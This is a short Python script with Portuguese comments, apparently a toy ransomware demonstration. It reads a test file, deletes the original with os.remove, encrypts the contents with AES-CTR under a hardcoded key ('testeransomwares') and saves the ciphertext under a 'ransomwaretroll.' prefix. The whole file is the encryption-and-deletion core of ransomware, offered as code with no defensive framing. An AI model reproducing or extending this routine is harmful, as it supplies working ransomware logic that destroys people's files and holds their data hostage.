import os
import pyaes

## abrir o arquivo a ser criptografado

file_name = 'teste.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

print("Dados do arquivo antes da criptografia:")
print(file_data)

## remover o arquivo original

os.remove(file_name)

## definir a chave de encryptacao

key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo

crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado

new_file = 'ransomwaretroll.' + file_name
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
